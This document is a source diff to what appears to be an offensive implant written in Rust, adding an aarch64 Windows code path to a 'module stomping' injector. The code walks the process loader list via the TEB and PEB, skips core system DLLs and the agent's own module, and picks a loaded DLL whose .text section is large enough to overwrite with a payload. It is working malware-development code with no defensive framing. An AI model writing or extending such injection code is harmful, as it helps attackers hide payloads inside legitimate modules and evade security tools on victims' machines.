@@ -107,6 +107,11 @@ impl Injector for ModuleStompInjector {
             //   +0x30  DllBase
             //   +0x58  BaseDllName.Length (u16, byte count)
             //   +0x60  BaseDllName.Buffer (pointer to UTF-16)
+            //
+            // The x86_64 path uses gs:[0x30]; aarch64 uses mrs tpidr_el0.
+            // Both are guarded by target_arch to prevent compile errors on
+            // architectures that don't have these registers (H-20 fix).
+            #[cfg(target_arch = "x86_64")]
             let target_dll: Option<String> = unsafe {
                 use core::arch::asm;
                 let teb: usize;
@@ -169,6 +174,77 @@ impl Injector for ModuleStompInjector {
                 }
                 found
             };
+
+            #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
+            let target_dll: Option<String> = unsafe {
+                use core::arch::asm;
+                let teb: usize;
+                asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
+                let peb = *(teb as *const usize).add(12) as *const u8;
+                let ldr = *(peb.add(0x18) as *const usize) as *const u8;
+                let list_head = ldr.add(0x10) as usize;
+                let mut entry = *(list_head as *const usize) as *const u8;
+
+                let mut found: Option<String> = None;
+                while entry as usize != list_head {
+                    let base = *(entry.add(0x30) as *const usize);
+                    let name_len = *(entry.add(0x58) as *const u16) as usize / 2;
+                    let name_ptr = *(entry.add(0x60) as *const usize) as *const u16;
+
+                    if base != 0 && !name_ptr.is_null() && name_len > 0 {
+                        let slice = std::slice::from_raw_parts(name_ptr, name_len);
+                        let name = String::from_utf16_lossy(slice);
+                        let lname = name.to_ascii_lowercase();
+
+                        let is_excluded = lname.starts_with("ntdll")
+                            || lname.starts_with("kernel32")
+                            || lname.starts_with("kernelbase")
+                            || lname.starts_with("agent")
+                            || lname.len() < 5;
+
+                        if !is_excluded {
+                            let dos = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
+                            if (*dos).e_magic == winapi::um::winnt::IMAGE_DOS_SIGNATURE {
+                                let nt = (base + (*dos).e_lfanew as usize)
+                                    as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
+                                let ns = (*nt).FileHeader.NumberOfSections as usize;
+                                let sec_base = nt as usize
+                                    + std::mem::size_of::<
+                                        winapi::um::winnt::IMAGE_NT_HEADERS64,
+                                    >();
+                                for i in 0..ns {
+                                    let sec = (sec_base
+                                        + i * std::mem::size_of::<
+                                            winapi::um::winnt::IMAGE_SECTION_HEADER,
+                                        >())
+                                        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
+                                    let nm = std::ptr::addr_of!((*sec).Name);
+                                    let nm_bytes = &*(nm as *const [u8; 8]);
+                                    if nm_bytes.starts_with(b".text") {
+                                        if *(*sec).Misc.VirtualSize() as usize >= payload.len() {
+                                            found = Some(name);
+                                        }
+                                        break;
+                                    }
+                                }
+                            }
+                        }
+                    }
+
+                    if found.is_some() {
+                        break;
+                    }
+                    entry = *(entry as *const usize) as *const u8;
+                }
+                found
+            };
+
+            // Fallback for architectures without a PEB walk implementation.
+            #[cfg(not(any(
+                target_arch = "x86_64",
+                all(target_arch = "aarch64", target_os = "windows")
+            )))]
+            let target_dll: Option<String> = None;
             let target_dll = match target_dll {
                 Some(n) => n,
                 None => {
